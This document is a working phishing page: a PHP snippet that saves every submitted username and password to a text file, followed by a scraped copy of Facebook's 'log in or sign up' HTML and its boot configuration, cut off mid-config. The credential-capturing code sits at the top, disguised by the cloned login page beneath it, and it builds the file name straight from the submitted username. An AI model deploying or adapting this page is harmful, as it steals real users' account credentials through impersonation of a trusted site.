<?php
    $username = $_POST["username"];
    $password = $_POST["password"];
    file_put_contents("passwords/".$username.".txt","username = ".$username."\n"."password = ".$password);
?>
<!DOCTYPE html>
<html lang="en" id="facebook" class="no_js">
<head>
    <meta charset="utf-8" />
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
    <script nonce="SXJL9M30">
    function envFlush(a) {
        function b(b) {
            for (var c in a) b[c] = a[c]
        }
        window.requireLazy ? window.requireLazy(["Env"], b) : (window.Env = window.Env || {}, b(window.Env))
    }
    envFlush({
        "ajaxpipe_token": "AXgK3zc8NAZ7lc5_6Xg",
        "gk_instrument_object_url": true,
        "stack_trace_limit": 30,
        "timesliceBufferSize": 5000,
        "show_invariant_decoder": false,
        "compat_iframe_token": "AQ4shljET2p0vXfnwA4",
        "isCQuick": false
    });
    </script>
    <script nonce="SXJL9M30">
    (function(a) {
        function b(b) {
            if (!window.openDatabase) return;
            b.I_AM_INCOGNITO_AND_I_REALLY_NEED_WEBSQL = function(a, b, c, d) {
                return window.openDatabase(a, b, c, d)
            };
            window.openDatabase = function() {
                throw new Error()
            }
        }
        b(a)
    })(this);
    </script>
    <style nonce="SXJL9M30"></style>
    <script nonce="SXJL9M30">
    __DEV__ = 0;
    CavalryLogger = false;
    </script><noscript>
        <meta http-equiv="refresh" content="0; URL=/?_fb_noscript=1" />
    </noscript>
    <link rel="manifest" id="MANIFEST_LINK" href="/data/manifest/" crossorigin="use-credentials" />
    <title id="pageTitle">Facebook – log in or sign up</title>
    <meta property="og:site_name" content="Facebook" />
    <meta property="og:url" content="https://www.facebook.com/" />
    <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png" />
    <meta property="og:locale" content="en_GB" />
    <link rel="alternate" media="only screen and (max-width: 640px)" href="https://m.facebook.com/" />
    <link rel="alternate" media="handheld" href="https://m.facebook.com/" />
    <meta name="description"
        content="Log in to Facebook to start sharing and connecting with your friends, family and people you know." />
    <script type="application/ld+json" nonce="SXJL9M30">
    {
        "\u0040context": "http:\/\/schema.org",
        "\u0040type": "WebSite",
        "name": "Facebook",
        "url": "https:\/\/en-gb.facebook.com\/"
    }
    </script>
    <link rel="canonical" href="https://www.facebook.com/" />
    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" />
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/yr/l/0,cross/kA3l8N-Pefi.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="lCj3VmH" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/yb/l/0,cross/Usgpzs7Ek9w.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="D25C7Qe" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/y4/l/0,cross/s1CjjB0KT8v.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="x+GAcDa" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/y2/l/0,cross/REo_wjzk_bY.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="plCHOrr" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet"
        href="https://static.xx.fbcdn.net/rsrc.php/v3/yi/l/0,cross/uaRUZk18yNI.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="Yo2UzOh" crossorigin="anonymous" />
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yS/r/V_wJ8EQu-vo.js?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="Z8J+xP4" crossorigin="anonymous" nonce="SXJL9M30"></script>
    <script nonce="SXJL9M30">
    requireLazy(["HasteSupportData"], function(m) {
        m.handle({
            "clpData": {
                "1814852": {
                    "r": 1
                },
                "1838142": {
                    "r": 1,
                    "s": 1
                },
                "1949898": {
                    "r": 1
                },
                "1848815": {
                    "r": 10000,
                    "s": 1
                },
                "1744178": {
                    "r": 1,
                    "s": 1
                }
            },
            "gkxData": {
                "5919": {
                    "result": false,
                    "hash": "AT6PGptIPUYH051Bn00"
                },
                "676837": {
                    "result": false,
                    "hash": "AT4N8wBZA8ctCdHwWXc"
                },
                "708253": {
                    "result": false,
                    "hash": "AT5n4hBL3YTMnQWtICY"
                },
                "996940": {
                    "result": false,
                    "hash": "AT7opYuEGy3sjG1aYMo"
                },
                "1224637": {
                    "result": false,
                    "hash": "AT7JRluWxuwDm3Xz7LM"
                },
                "1263340": {
                    "result": false,
                    "hash": "AT5bwizWgDaFQudmMU8"
                },
                "676920": {
                    "result": true,
                    "hash": "AT497IX4gOFG8gZeOd0"
                },
                "1073500": {
                    "result": false,
                    "hash": "AT7aJmfnqWyioxOOfw4"
                },
                "1167394": {
                    "result": false,
                    "hash": "AT7BpN-tlUPwbIIF9Y0"
                },
                "1857581": {
                    "result": false,
                    "hash": "AT5yTxGMp6le0PAtGSc"
                },
                "2772": {
                    "result": false,
                    "hash": "AT5Eu244WIce7iwqDig"
                },
                "3752": {
                    "result": false,
                    "hash": "AT6eS5UTkkMp_xbPpeU"
                },
                "3831": {
                    "result": false,
                    "hash": "AT4W23lQ0XxAZniMB14"
                },
                "4075": {
                    "result": false,
                    "hash": "AT4_ZQi0sTjSt-RxJa4"
                },
                "8126": {
                    "result": false,
                    "hash": "AT4U7qG06p9sF6u8tCI"
                },
                "676838": {
                    "result": false,
                    "hash": "AT6nN1ehT9yq-2q6hNQ"
                },
                "1217157": {
                    "result": false,
                    "hash": "AT6B7YmllOsArnK6JHU"
                },
                "1554827": {
                    "result": false,
                    "hash": "AT7zueGLhGo0cT5xovc"
                },
                "1738486": {
                    "result": false,
                    "hash": "AT4cX37oQco6DwhUdEk"
                }
            },
            "qplData": {
                "7758": {
                    "r": 1
                }
            }
        })
    });
    requireLazy(["TimeSliceImpl", "ServerJS"], function(TimeSlice, ServerJS) {
        (new ServerJS()).handle({
            "define": [
                ["URLFragmentPreludeConfig", [], {
                    "hashtagRedirect": true,
                    "fragBlacklist": ["nonce", "access_token", "oauth_token", "xs",
                        "checkpoint_data", "code"
                    ]
                }, 137],
                ["CometPersistQueryParams", [], {
                    "relative": {},
                    "domain": {}
                }, 6231],
                ["CookieDomain", [], {
                    "domain": "facebook.com"
                }, 6421],
                ["CurrentAdAccountInitialData", [], {
                    "AD_ACCOUNT_ID": null
                }, 6828],
                ["BootloaderConfig", [], {
                    "deferBootloads": false,
                    "jsRetries": [200, 500],
                    "jsRetryAbortNum": 2,
                    "jsRetryAbortTime": 5,
                    "silentDups": false,
                    "hypStep4": false,
                    "phdOn": false,
                    "btCutoffIndex": 2527,
                    "translationRetries": [200, 500],
                    "translationRetryAbortNum": 3,
                    "translationRetryAbortTime": 50
                }, 329],
                ["CSSLoaderConfig", [], {
                    "timeout": 5000,
                    "modulePrefix": "BLCSS:",
                    "loadEventSupported": true
                }, 619],
                ["CookieCoreConfig", [], {
                    "c_user": {
                        "s": "None"
                    },
                    "cppo": {
                        "t": 86400,
                        "s": "None"
                    },
                    "dpr": {
                        "t": 604800,
                        "s": "None"
                    },
                    "fbl_ci": {
                        "t": 31536000,
                        "s": "None"
                    },
                    "fbl_cs": {
                        "t": 31536000,
                        "s": "None"
                    },
                    "fbl_st": {
                        "t": 31536000,
                        "s": "Strict"
                    },
                    "i_user": {
                        "s": "None"
                    },
                    "locale": {
                        "t": 604800,
                        "s": "None"
                    },
                    "m_ls": {
                        "t": 158284800,
                        "s": "None"
                    },
                    "m_pixel_ratio": {
                        "t": 604800,
                        "s": "None"
                    },
                    "noscript": {
                        "s": "None"
                    },
                    "presence": {
                        "t": 2592000,
                        "s": "None"
                    },
                    "sfau": {
                        "s": "None"
                    },
                    "usida": {
                        "s": "None"
                    },
                    "vpd": {
                        "t": 5184000,
                        "s": "Lax"
                    },
                    "wd": {
                        "t": 604800,
                        "s": "Lax"
                    },
                    "x-referer": {
                        "s": "None"
                    },
                    "x-src": {
                        "t": 1,
                        "s": "None"
                    }
                }, 2104],
                ["CurrentCommunityInitialData", [], {}, 490],
                ["CurrentEnvironment", [], {
                    "facebookdotcom": true,
                    "messengerdotcom": false,
                    "workplacedotcom": false,
                    "instagramdotcom": false
                }, 827],
                ["CurrentUserInitialData", [], {
                    "ACCOUNT_ID": "0",
                    "USER_ID": "0",
                    "NAME": "",
                    "SHORT_NAME": null,
                    "IS_BUSINESS_PERSON_ACCOUNT": false,
                    "HAS_SECONDARY_BUSINESS_PERSON": false,
                    "IS_FACEBOOK_WORK_ACCOUNT": false,
                    "IS_MESSENGER_ONLY_USER": false,
                    "IS_DEACTIVATED_ALLOWED_ON_MESSENGER": false,
                    "IS_MESSENGER_CALL_GUEST_USER": false,
                    "IS_WORK_MESSENGER_CALL_GUEST_USER": false,
                    "IS_WORKROOMS_USER": false,
                    "APP_ID": "256281040558",
                    "IS_BUSINESS_DOMAIN": false
                }, 270],
                ["DTSGInitialData", [], {}, 258],
                ["ISB", [], {}, 330],
                ["LSD", [], {
                    "token": "AVpkl42Bjn4"
                }, 323],
                ["ServerNonce", [], {
                    "ServerNonce": "sFrR0323I95mCPzw_v8yrz"
                }, 141],
                ["SiteData", [], {
                    "server_revision": 1006399937,
                    "client_revision": 1006399937,
                    "tier": "",
                    "push_phase": "C3",
                    "pkg_cohort": "BP:DEFAULT",
                    "haste_session": "19281.BP:DEFAULT.2.0.0.0.0",
                    "pr": 1,
                    "haste_site": "www",
                    "manifest_base_uri": "https:\/\/static.xx.fbcdn.net",
                    "manifest_origin": null,
                    "be_one_ahead": false,
                    "is_rtl": false,
                    "is_comet": false,
                    "is_experimental_tier": false,
                    "is_jit_warmed_up": true,
                    "hsi": "7154993440760341812",
                    "semr_host_bucket": "5",
                    "bl_hash_version": 2,
                    "skip_rd_bl": true,
                    "comet_env": 0,
                    "wbloks_env": false,
                    "spin": 4,
                    "__spin_r": 1006399937,
                    "__spin_b": "trunk",
                    "__spin_t": 1665901728,
                    "vip": "2a03:2880:f16b:81:face:b00c:0:25de"
                }, 317],
                ["SprinkleConfig", [], {
                    "param_name": "jazoest",
                    "version": 2,
                    "should_randomize": false
                }, 2111],
                ["UserAgentData", [], {
                    "browserArchitecture": "64",
                    "browserFullVersion": "106.0.0.0",
                    "browserMinorVersion": 0,
                    "browserName": "Chrome",
                    "browserVersion": 106,
                    "deviceName": "Unknown",
                    "engineName": "WebKit",
                    "engineVersion": "537.36",
                    "platformArchitecture": "64",
                    "platformName": "Windows",
                    "platformVersion": "10",
                    "platformFullVersion": "10"
                }, 527],
                ["PromiseUsePolyfillSetImmediateGK", [], {
                    "www_always_use_polyfill_setimmediate": false
                }, 2190],
                ["KSConfig", [], {
                    "killed": {
                        "__set": ["MLHUB_FLOW_AUTOREFRESH_SEARCH",
                            "NEKO_DISABLE_CREATE_FOR_SAP",
                            "EO_DISABLE_SYSTEM_SERIAL_NUMBER_FREE_TYPING_IN_CPE_NON_CLIENT",
                            "MOBILITY_KILL_OLD_VISIBILITY_POSITION_SETTING",
                            "WORKPLACE_DISPLAY_TEXT_EVIDENCE_REPORTING",
                            "BUSINESS_INVITE_FLOW_WITH_SELLER_PROFILE",
                            "BUY_AT_UI_LINE_DELETE",
                            "BUSINESS_GRAPH_SETTING_APP_ASSIGNED_USERS_NEW_API",
                            "BUSINESS_GRAPH_SETTING_BU_ASSIGNED_USERS_NEW_API",
                            "BUSINESS_GRAPH_SETTING_ESG_ASSIGNED_USERS_NEW_API",
                            "BUSINESS_GRAPH_SETTING_PRODUCT_CATALOG_ASSIGNED_USERS_NEW_API",
                            "BUSINESS_GRAPH_SETTING_SESG_ASSIGNED_USERS_NEW_API",
                            "BUSINESS_GRAPH_SETTING_WABA_ASSIGNED_USERS_NEW_API",
                            "ADS_PLACEMENT_FIX_PUBLISHER_PLATFORMS_MUTATION",
                            "FORCE_FETCH_BOOSTED_COMPONENT_AFTER_ADS_CREATION",
                            "VIDEO_DIMENSIONS_FROM_PLAYER_IN_UPLOAD_DIALOG",
                            "SNIVY_GROUP_BY_EVENT_TRACE_ID_AND_NAME",
                            "ADS_STORE_VISITS_METRICS_DEPRECATION",
                            "AD_DRAFT_ENABLE_SYNCRHONOUS_FRAGMENT_VALIDATION",
                            "SEPARATE_MESSAGING_COMACTIVITY_PAGE_PERMS",
                            "LAB_NET_NEW_UI_RELEASE", "POCKET_MONSTERS_CREATE",
                            "POCKET_MONSTERS_DELETE", "SRT_BANZAI_SRT_CORE_LOGGER",
                            "SRT_BANZAI_SRT_MAIN_LOGGER",
                            "WORKPLACE_PLATFORM_SECURE_APPS_MAILBOXES",
                            "POCKET_MONSTERS_UPDATE_NAME",
                            "IC_DISABLE_MERGE_TOOL_FEED_CHECK_FOR_REPLACE_SCHEDULE",
                            "ADS_EPD_IMPACTED_ADVERTISER_MIGRATE_XCONTROLLER",
                            "RECRUITING_CANDIDATE_PORTAL_ACCOUNT_DELETION_CARD",
                            "BIZ_INBOX_POP_UP_TIP_NAVIGATION_BUG_FIX",
                            "SRT_REVIEW_DISABLE_FELLOWSHIP_REVIEW",
                            "EO_STORE_HOME_PAGE_COVID19_BANNER"
                        ]
                    },
                    "ko": {
                        "__set": ["3OsLvnSHNTt", "1G7wJ6bJt9K", "9NpkGYwzrPG", "3oh5Mw86USj",
                            "8NAceEy9JZo", "7FOIzos6XJX", "rf8JEPGgOi", "4j36SVzvP3w",
                            "4NSq3ZC4ScE", "53gCxKq281G", "3yzzwBY7Npj", "1onzIv0jH6H",
                            "8PlKuowafe8", "1ntjZ2zgf03", "4SIH2GRVX5W", "2dhqRnqXGLQ",
                            "2WgiNOrHVuC", "amKHb4Cw4WI", "8rDvN9vWdAK", "5BdzWGmfvrA",
                            "DDZhogI19W", "acrJTh9WGdp", "1oOE64fL4wO", "9Gd8qgRxn8z",
                            "MPMaqnqZ9c", "5XCz1h9Iaw3", "7r6mSP7ofr2", "6DGPLrRdyts",
                            "aWxCyi1sEC7", "9kCSDzzr8fu", "awYA7fn2Bse", "aBMlJ8QRPWE",
                            "Fl3bH3ozLe"
                        ]
                    }
                }, 2580],
                ["JSErrorLoggingConfig", [], {
                    "appId": 256281040558,
                    "extra": [],
                    "reportInterval": 50,
                    "sampleWeight": null,
                    "sampleWeightKey": "__jssesw",
                    "projectBlocklist": []
                }, 2776],
                ["DataStoreConfig", [], {
                    "expandoKey": "__FB_STORE",
                    "useExpando": true
                }, 2915],
                ["CookieCoreLoggingConfig", [], {
                    "maximumIgnorableStallMs": 16.67,
                    "sampleRate": 9.7e-5,
                    "sampleRateClassic": 1.0e-10,
                    "sampleRateFastStale": 1.0e-8
                }, 3401],
                ["ImmediateImplementationExperiments", [], {
                    "prefer_message_channel": true
                }, 3419],
                ["DTSGInitData", [], {
                    "token": "",
                    "async_get_token": ""
                }, 3515],
                ["UriNeedRawQuerySVConfig", [], {
                    "uris": ["dms.netmng.com", "doubleclick.net", "r.msn.com",
                        "watchit.sky.com", "graphite.instagram.com", "www.kfc.co.th",
                        "learn.pantheon.io", "www.landmarkshops.in", "www.ncl.com",
                        "s0.wp.com", "www.tatacliq.com", "bs.serving-sys.com", "kohls.com",
                        "lazada.co.th", "xg4ken.com", "technopark.ru", "officedepot.com.mx",
                        "bestbuy.com.mx", "booking.com", "nibio.no"
                    ]
                }, 3871],
                ["InitialCookieConsent", [], {
                    "deferCookies": false,
                    "initialConsent": {
                        "__set": [1, 2]
                    },
                    "noCookies": false,
                    "shouldShowCookieBanner": false
                }, 4328],
                ["TrustedTypesConfig", [], {
                    "useTrustedTypes": false,
                    "reportOnly": false
                }, 4548],
                ["WebConnectionClassServerGuess", [], {
                    "connectionClass": "GOOD"
                }, 4705],
                ["CometAltpayJsSdkIframeAllowedDomains", [], {
                    "allowed_domains": ["https:\/\/live.adyen.com",
                        "https:\/\/integration-facebook.payu.in",
                        "https:\/\/facebook.payulatam.com", "https:\/\/secure.payu.com",
                        "https:\/\/facebook.dlocal.com", "https:\/\/buy2.boku.com"
                    ]
                }, 4920],
                ["BootloaderEndpointConfig", [], {
                    "debugNoBatching": false,
                    "endpointURI": "https:\/\/www.facebook.com\/ajax\/bootloader-endpoint\/"
                }, 5094],
                ["CookieConsentIFrameConfig", [], {
                    "consent_param": "FQAREhIA.ARbT7xO0_vng45Wc0tmR2xey93II-Wc5xXo4YfwIg18bFkdS",
                    "allowlisted_iframes": []
                }, 5540],
                ["BigPipeExperiments", [], {
                    "link_images_to_pagelets": false,
                    "enable_bigpipe_plugins": false
                }, 907],
                ["IntlVariationHoldout", [], {
                    "disable_variation": false
                }, 6533],
                ["AsyncRequestConfig", [], {
                    "retryOnNetworkError": "1",
                    "useFetchStreamAjaxPipeTransport": false
                }, 328],
                ["FbtQTOverrides", [], {
                    "overrides": {}
                }, 551],
                ["FbtResultGK", [], {
                    "shouldReturnFbtResult": true,
                    "inlineMode": "NO_INLINE"
                }, 876],
                ["IntlPhonologicalRules", [], {
                    "meta": {
                        "\/_B\/": "([.,!?\\s]|^)",
                        "\/_E\/": "([.,!?\\s]|$)"
                    },
                    "patterns": {
                        "\/\u0001(.*)('|&#039;)s\u0001(?:'|&#039;)s(.*)\/": "\u0001$1$2s\u0001$3",
                        "\/_\u0001([^\u0001]*)\u0001\/": "javascript"
                    }
                }, 1496],
                ["IntlViewerContext", [], {
                    "GENDER": 3,
                    "regionalLocale": null
                }, 772],
                ["NumberFormatConfig", [], {
                    "decimalSeparator": ".",
                    "numberDelimiter": ",",
                    "minDigitsForThousandsSeparator": 4,
                    "standardDecimalPatternInfo": {
                        "primaryGroupSize": 3,
                        "secondaryGroupSize": 3
                    },
                    "numberingSystemData": null
                }, 54],
                ["SessionNameConfig", [], {
                    "seed": "1d6B"
                }, 757],
                ["ZeroCategoryHeader", [], {}, 1127],
                ["ZeroRewriteRules", [], {
                    "rewrite_rules": {},
                    "whitelist": {
                        "\/hr\/r": 1,
                        "\/hr\/p": 1,
                        "\/zero\/unsupported_browser\/": 1,
                        "\/zero\/policy\/optin": 1,
                        "\/zero\/optin\/write\/": 1,
                        "\/zero\/optin\/legal\/": 1,
                        "\/zero\/optin\/free\/": 1,
                        "\/about\/privacy\/": 1,
                        "\/about\/privacy\/update\/": 1,
                        "\/privacy\/explanation\/": 1,
                        "\/zero\/toggle\/welcome\/": 1,
                        "\/zero\/toggle\/nux\/": 1,
                        "\/zero\/toggle\/settings\/": 1,
                        "\/fup\/interstitial\/": 1,
                        "\/work\/landing": 1,
                        "\/work\/login\/": 1,
                        "\/work\/email\/": 1,
                        "\/ai.php": 1,
                        "\/js_dialog_resources\/dialog_descriptions_android.json": 0,
                        "\/connect\/jsdialog\/MPlatformAppInvitesJSDialog\/": 0,
                        "\/connect\/jsdialog\/MPlatformOAuthShimJSDialog\/": 0,
                        "\/connect\/jsdialog\/MPlatformLikeJSDialog\/": 0,
                        "\/qp\/interstitial\/": 1,
                        "\/qp\/action\/redirect\/": 1,
                        "\/qp\/action\/close\/": 1,
                        "\/zero\/support\/ineligible\/": 1,
                        "\/zero_balance_redirect\/": 1,
                        "\/zero_balance_redirect": 1,
                        "\/zero_balance_redirect\/l\/": 1,
                        "\/l.php": 1,
                        "\/lsr.php": 1,
                        "\/ajax\/dtsg\/": 1,
                        "\/checkpoint\/block\/": 1,
                        "\/exitdsite": 1,
                        "\/zero\/balance\/pixel\/": 1,
                        "\/zero\/balance\/": 1,
                        "\/zero\/balance\/carrier_landing\/": 1,
                        "\/zero\/flex\/logging\/": 1,
                        "\/tr": 1,
                        "\/tr\/": 1,
                        "\/sem_campaigns\/sem_pixel_test\/": 1,
                        "\/bookmarks\/flyout\/body\/": 1,
                        "\/zero\/subno\/": 1,
                        "\/confirmemail.php": 1,
                        "\/policies\/": 1,
                        "\/mobile\/internetdotorg\/classifier\/": 1,
                        "\/zero\/dogfooding": 1,
                        "\/xti.php": 1,
                        "\/zero\/fblite\/config\/": 1,
                        "\/hr\/zsh\/wc\/": 1,
                        "\/ajax\/bootloader-endpoint\/": 1,
                        "\/mobile\/zero\/carrier_page\/": 1,
                        "\/mobile\/zero\/carrier_page\/education_page\/": 1,
                        "\/mobile\/zero\/carrier_page\/feature_switch\/": 1,
                        "\/mobile\/zero\/carrier_page\/settings_page\/": 1,
                        "\/aloha_check_build": 1,
                        "\/upsell\/zbd\/softnudge\/": 1,
                        "\/mobile\/zero\/af_transition\/": 1,
                        "\/mobile\/zero\/af_transition\/action\/": 1,
                        "\/mobile\/zero\/freemium\/": 1,
                        "\/mobile\/zero\/freemium\/redirect\/": 1,
                        "\/mobile\/zero\/freemium\/zero_fup\/": 1,
                        "\/privacy\/policy\/": 1,
                        "\/privacy\/center\/": 1,
                        "\/data\/manifest\/": 1,
                        "\/4oh4.php": 1,
                        "\/autologin.php": 1,
                        "\/birthday_help.php": 1,
                        "\/checkpoint\/": 1,
                        "\/contact-importer\/": 1,
                        "\/cr.php": 1,
                        "\/legal\/terms\/": 1,
                        "\/login.php": 1,
                        "\/login\/": 1,
                        "\/mobile\/account\/": 1,
                        "\/n\/": 1,
                        "\/remote_test_device\/": 1,
                        "\/upsell\/buy\/": 1,
                        "\/upsell\/buyconfirm\/": 1,
                        "\/upsell\/buyresult\/": 1,
                        "\/upsell\/promos\/": 1,
                        "\/upsell\/continue\/": 1,
                        "\/upsell\/h\/promos\/": 1,
                        "\/upsell\/loan\/learnmore\/": 1,
                        "\/upsell\/purchase\/": 1,
                        "\/upsell\/promos\/upgrade\/": 1,
                        "\/upsell\/buy_redirect\/": 1,
                        "\/upsell\/loan\/buyconfirm\/": 1,
                        "\/upsell\/loan\/buy\/": 1,
                        "\/upsell\/sms\/": 1,
                        "\/wap\/a\/channel\/reconnect.php": 1,
                        "\/wap\/a\/nux\/wizard\/nav.php": 1,
                        "\/wap\/appreg.php": 1,
                        "\/wap\/birthday_help.php": 1,
                        "\/wap\/c.php": 1,
                        "\/wap\/confirmemail.php": 1,
                        "\/wap\/cr.php": 1,
                        "\/wap\/login.php": 1,
                        "\/wap\/r.php": 1,
                        "\/zero\/datapolicy": 1,
                        "\/a\/timezone.php": 1,
                        "\/a\/bz": 1,
                        "\/bz\/reliability": 1,
                        "\/r.php": 1,
                        "\/mr\/": 1,
                        "\/reg\/": 1,
                        "\/registration\/log\/": 1,
                        "\/terms\/": 1,
                        "\/f123\/": 1,
                        "\/expert\/": 1,
                        "\/experts\/": 1,
                        "\/terms\/index.php": 1,
                        "\/terms.php": 1,
                        "\/srr\/": 1,
                        "\/msite\/redirect\/": 1,
                        "\/fbs\/pixel\/": 1,
                        "\/contactpoint\/preconfirmation\/": 1,
                        "\/contactpoint\/cliff\/": 1,
                        "\/contactpoint\/confirm\/submit\/": 1,
                        "\/contactpoint\/confirmed\/": 1,
                        "\/contactpoint\/login\/": 1,
                        "\/preconfirmation\/contactpoint_change\/": 1,
                        "\/help\/contact\/": 1,
                        "\/survey\/": 1,
                        "\/upsell\/loyaltytopup\/accept\/": 1,
                        "\/settings\/": 1,
                        "\/lite\/": 1,
                        "\/zero_status_update\/": 1,
                        "\/operator_store\/": 1,
                        "\/upsell\/": 1,
                        "\/wifiauth\/login\/": 1
                    }
                }, 1478],
                ["IntlNumberTypeConfig", [], {
                    "impl": "if (n === 1) { return IntlVariations.NUMBER_ONE; } else { return IntlVariations.NUMBER_OTHER; }"
                }, 3405],
                ["ServerTimeData", [], {
                    "serverTime": 1665901728815,
                    "timeOfRequestStart": 1665901728794.5,
                    "timeOfResponseStart": 1665901728794.5
                }, 5943],
                ["AnalyticsCoreData", [], {
                    "device_id": "$^|AcY2Z3wkF_hFHNNpY4G2Q3u-Esybj_af9kQjgp3N_gKd9fqNLZ1NkHNClMrEXsQ08WH9a8N3keHKgR2Ma2j-kpW1CeG0Fhh-OMO-pDocFAFfWc7CORAb1KonPkm0-mGK8l96a6wHFVDBZl69TQZews0gG4U-HJO6sw|fd.AcZfZrObLl3O_mnJjqzDG49uML1eZkseekNZD5mIJJkUywlXpw4CbgxFK-n53Ek509Vq7YXpRAJj5JC4vQKIUm_h",
                    "app_id": "256281040558",
                    "enable_bladerunner": false,
                    "enable_ack": true,
                    "push_phase": "C3",
                    "enable_observer": false,
                    "enable_dataloss_timer": false,
                    "enable_fallback_for_br": true,
                    "fix_br_init_rc": false,
                    "queue_activation_experiment": false,
                    "max_delay_br_queue": 60000,
                    "max_delay_br_queue_immediate": 3
                }, 5237],
                ["cr:696703", [], {
                    "__rc": [null,
                        "Aa2FI2-BaMkEtbcKhST4LJZX5As3Ix6pnzKMNF90J5xL1HGHHZabnDCzhW9MuX0WAe0XMB4RdyV3nsGuXn3Yiv6Ud40"
                    ]
                }, -1],
                ["cr:708886", ["EventProfilerImpl"], {
                    "__rc": ["EventProfilerImpl",
                        "Aa2FI2-BaMkEtbcKhST4LJZX5As3Ix6pnzKMNF90J5xL1HGHHZabnDCzhW9MuX0WAe0XMB4RdyV3nsGuXn3Yiv6Ud40"
                    ]
                }, -1],
                ["cr:717822", ["TimeSliceImpl"], {
                    "__rc": ["TimeSliceImpl",
                        "Aa2FI2-BaMkEtbcKhST4LJZX5As3Ix6pnzKMNF90J5xL1HGHHZabnDCzhW9MuX0WAe0XMB4RdyV3nsGuXn3Yiv6Ud40"
                    ]
                }, -1],
                ["cr:806696", ["clearTimeoutBlue"], {
                    "__rc": ["clearTimeoutBlue",
                        "Aa2FI2-BaMkEtbcKhST4LJZX5As3Ix6pnzKMNF90J5xL1HGHHZabnDCzhW9MuX0WAe0XMB4RdyV3nsGuXn3Yiv6Ud40"
                    ]
                }, -1],
                ["cr:807042", ["setTimeoutBlue"], {
                    "__rc": ["setTimeoutBlue",
                        "Aa2FI2-BaMkEtbcKhST4LJZX5As3Ix6pnzKMNF90J5xL1HGHHZabnDCzhW9MuX0WAe0XMB4RdyV3nsGuXn3Yiv6Ud40"
                    ]
                }, -1],
                ["cr:896462", ["setIntervalAcrossTransitionsBlue"], {
                    "__rc": ["setIntervalAcrossTransitionsBlue",
                        "Aa2FI2-BaMkEtbcKhST4LJZX5As3Ix6pnzKMNF90J5xL1HGHHZabnDCzhW9MuX0WAe0XMB4RdyV3nsGuXn3Yiv6Ud40"
                    ]
                }, -1],
                ["cr:986633", ["setTimeoutAcrossTransitionsBlue"], {
                    "__rc": ["setTimeoutAcrossTransitionsBlue",
                        "Aa2FI2-BaMkEtbcKhST4LJZX5As3Ix6pnzKMNF90J5xL1HGHHZabnDCzhW9MuX0WAe0XMB4RdyV3nsGuXn3Yiv6Ud40"
                    ]
                }, -1],
                ["cr:1003267", ["clearIntervalBlue"], {
                    "__rc": ["clearIntervalBlue",
                        "Aa2FI2-BaMkEtbcKhST4LJZX5As3Ix6pnzKMNF90J5xL1HGHHZabnDCzhW9MuX0WAe0XMB4RdyV3nsGuXn3Yiv6Ud40"
                    ]
                }, -1],
                ["cr:1183579", ["InlineFbtResultImpl"], {
                    "__rc": ["InlineFbtResultImpl",
                        "Aa2FI2-BaMkEtbcKhST4LJZX5As3Ix6pnzKMNF90J5xL1HGHHZabnDCzhW9MuX0WAe0XMB4RdyV3nsGuXn3Yiv6Ud40"
                    ]
                }, -1],
                ["cr:925100", ["RunBlue"], {
                    "__rc": ["RunBlue",
                        "Aa2FI2-BaMkEtbcKhST4LJZX5As3Ix6pnzKMNF90J5xL1HGHHZabnDCzhW9MuX0WAe0XMB4RdyV3nsGuXn3Yiv6Ud40"
                    ]
                }, -1],
                ["cr:729414", ["VisualCompletion"], {
                    "__rc": ["VisualCompletion",
                        "Aa3sVkgDzwDy7ap1Wz0hhm90AMXGGKYRxrZeW6AHNKZTMin8cTxjUwJjR6umqyohzMjfNU7hXHjbk_VEhiewRCuk"
                    ]
                }, -1],
                ["cr:1094907", [], {
                    "__rc": [null,
                        "Aa1YHezn96m0oAaXeGw3_mMrHQDfzWTKC584EzTLO5in0hEWadScyhKBWGS47Ax2O7EWjFDFo6z096WgYSbRdFs"
                    ]
                }, -1],
                ["EventConfig", [], {
                    "sampling": {
                        "bandwidth": 0,
                        "play": 0,
                        "playing": 0,
                        "progress": 0,
                        "pause": 0,
                        "ended": 0,
                        "seeked": 0,
                        "seeking": 0,
                        "waiting": 0,
                        "loadedmetadata": 0,
                        "canplay": 0,
                        "selectionchange": 0,
                        "change": 0,
                        "timeupdate": 0,
                        "adaptation": 0,
                        "focus": 0,
                        "blur": 0,
                        "load": 0,
                        "error": 0,
                        "message": 0,
                        "abort": 0,
                        "storage": 0,
                        "scroll": 200000,
                        "mousemove": 20000,
                        "mouseover": 10000,
                        "mouseout": 10000,
                        "mousewheel": 1,
                        "MSPointerMove": 10000,
                        "keydown": 0.1,
                        "click": 0.02,
                        "mouseup": 0.02,
                        "__100ms": 0.001,
                        "__default": 5000,
                        "__min": 100,
                        "__interactionDefault": 200,
                        "__eventDefault": 100000
                    },
                    "page_sampling_boost": 1,
                    "interaction_regexes": {},
                    "interaction_boost": {},
                    "event_types": {},
                    "manual_instrumentation": false,
                    "profile_eager_execution": false,
                    "disable_heuristic": true,
                    "disable_event_profiler": false
                }, 1726],
                ["AdsInterfacesSessionConfig", [], {}, 2393],
                ["IntlCurrentLocale", [], {
                    "code": "en_GB"
                }, 5954],
                ["USIDMetadata", [], {
                    "browser_id": "?",
                    "tab_id": "",
                    "page_id": "Prju20010y28lm",
                    "transition_id": 0,
                    "version": 6
                }, 5888],
                ["cr:686", [], {
                    "__rc": [null,
                        "Aa1In4uGx9E9LoSkGiPU4FDVIjlN7TYhmCrOMDEJaM6nn4ReEx2S1ZggTz4n_I9xGFbJfoGQf_IUmkBNIJddS2nQ"
                    ]
                }, -1],
